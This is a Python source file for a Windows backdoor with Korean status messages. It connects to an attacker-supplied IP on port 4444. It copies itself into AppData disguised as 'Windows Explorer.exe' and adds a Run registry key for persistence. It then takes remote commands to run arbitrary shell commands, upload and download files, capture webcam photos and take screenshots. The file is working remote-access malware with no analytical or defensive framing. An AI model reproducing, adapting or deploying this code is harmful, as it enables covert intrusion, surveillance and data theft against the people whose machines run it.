import subprocess
import socket
import os
import json
import base64
import sys
import shutil
import cv2
import pyautogui

class Backdoor:
    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        print("[+] 연결 성공!")

    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b" "
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
                
    def photo(self):
        cap = cv2.VideoCapture(0)
        if cap.isOpened():

            while True:
                ret, frame = cap.read()

                if ret:
                    cv2.imshow('camera', frame)
                    cv2.imwrite('photo.jpg', frame)
                    photo = 'photo.jpg'
                    self.read_file(photo)
                    break

                else:
                    print('no frame')
                    break
        else:
            print('no camera!')
        cap.release()
        cv2.destroyAllWindows()
        return "카메라 캡쳐 완료"

    def screenshot(self):
        pyautogui.screenshot('my_screenshot.png')
        return "화면 스크린샷 완료"

    def change_directory(self, path):
        os.chdir(path)
        return "[+] 디렉터리가 " + path + "로 변경되었습니다."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content.encode()))
            return "다운로드 성공!"

    def execute_system_process(self, command):
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL, text=True)
            return result
        except subprocess.CalledProcessError as e:
            return str(e.output)

    def run(self):
        while True:
            command = self.reliable_receive()

            if command[0] == 'exit':
                self.connection.close()
                sys.exit()
            elif command[0] == 'download':
                command_result = self.read_file(command[1]).decode()
            elif command[0] == 'upload':
                command_result = self.write_file(command[1], command[2])
            elif command[0] == 'cd' and len(command) > 1:
                command_result = self.change_directory(command[1])
            elif command[0] == 'photo':
                command_result = self.photo()
            elif command[0] == 'screenshot':
                command_result = self.screenshot()
            else:
                command_result = self.execute_system_process(command)

            self.reliable_send(command_result)

try:
    my_backdoor = Backdoor("아이피", 4444)
    my_backdoor.run()
except Exception:
    sys.exit()
